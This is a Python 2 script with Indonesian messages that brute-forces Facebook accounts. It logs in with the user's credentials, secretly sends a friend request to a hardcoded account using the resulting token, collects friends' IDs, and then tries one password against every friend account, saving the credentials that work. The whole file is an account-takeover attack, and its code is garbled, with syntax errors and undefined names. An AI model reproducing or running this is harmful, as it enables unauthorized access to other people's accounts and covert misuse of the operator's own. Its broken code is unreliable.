import os
import sys
import time
import json
import urllib
import random
import hashlib
from multiprocessing.pool import ThreadPool
from mechanize import Browser

m = "\033[31;1m" # Merah
h = "\033[32;1m" # Hijau
p = "\033[37;1m" # putih

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')

br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

count = 0
id_koncomu = []
dados = []

def login():
    try:
        token = open('token.txt', 'r')
        main()
    except (KeyError, IOError):
        print h+" LOGIN FACEBOOK BRO.."
        user = str_raw(input(p+" Username :"))
        passw = str_raw(input(p+" Password :"))
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print m+" [ Tidak ada koneksi.. ]"
        br.select_form(nr=0)
        br.form['email'] = user
        br.form['pass'] = passw
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                dev = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + user + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + passw + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': user, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': passw, 'return_ssl_resources': '0', 'v': '1.0'}
                data.update({'dev': a})
                url = 'https://api.facebook.com/restserver.php'
                req = requests.get(url, params=data)
                jsl = json.loads(req.text)
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+jsl['access_token'])
                print h+" Berhasil Login...."
                iq = open('token.txt', 'w')
                iq.write(jsl['access_token'])
                iq.close()
                id_konco
            except KeyError:
                print m+" [ Terjadi Kesalahan.. ]"
        if 'checkpoint' in url:
            print m+" Akun Kena Cekpoint.."

        else:
            print m+" Gagal Login..."

def id_konco():
    try:
        token = open('token.txt', 'r').read()
    except IOError:
        print m+" Tidak ada Token "
    else:
        try:
            req = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
            jsl = json.loads(req.text)
            simpan_id = open('id.txt', 'w')
            for iq in jsl['data']:
                id_koncomu.append(iq['id'])
                simpan_id.write(iq["id"] + "\n")
                print h+" Mengambil id"+ iq['name'] + iq['id']
            print p+" Jumlah Id Yg Terambil %s" % len(id_koncomu)
            print p+" File Disimpan Dengan Nama" + simpan_id
            simpan_id.close()
            mbf()
        except IOError:
            print m+" Terjadi Kesalahan..."

def mbf():
    global list_id
    global password

    try:
        token = open('token.txt', 'r')
    except IOError:
        print m+" Token Tidak Ditemukan.."
        login()
    else:
        print h+" Multi Brute Force."
        list_id = open('id.txt', 'r').read()
        password = raw_input(p+" Masukkan Password : ")
        
        file_id = open('id.txt', 'r')
        for iq in range(20):
                dev = threading.Thread(target=cracking, args=())
                dev.start()
                threads.append(dev)

        for dev in threads:
                dev.join()

def cracking():
    global count
    global dados
    global cekpoint
    global oradadi

    bedel = open(list_id, 'r')
    buk = bedel.read().split()
    while file_id:
        id_target = file_id.readlines().strip()
        url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id_target + '&locale=en_US&password=' + password + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
        data = urllib.urlopen(url)
        jsl = json.load(data)
        if count == len(buk):
            break
        if 'accsess_token' in jsl:
            hasil = open('berhasilcuk.txt', 'w')
            hasil.write(id_target + "=>" + password)
            hasil.close()
            dados.append('\033[34;1m [OK] \033[32;1m '+ id_target + '|' + password)
            count += 1
        
        else:
            if 'www.facebook.com' in jsl['error_msg']:
                cekpo = open('cekpoint.txt', 'w')
                cekpo.write(id_target + '|' + password)
                cekpo.close()
                cekpoint.append(' \033[31;1m [CP] \033[33;1m '+ id_target + '|' + password')                count += 1
            else:
                oradadi.append(id_target)
               
                count += 1
        sys.stdout.write('\r \033[37;1m Crack : [ '+ str(count) + '==' + str(len(buk)) + '\033[32;1m ==> Live ' + str(len(dados)) + '\033[33;1m Cekpo [ ' + str(len(cekpoint)))
        sys.stdout.flush()
def main():
    login()
if __name__=="__main__":
main()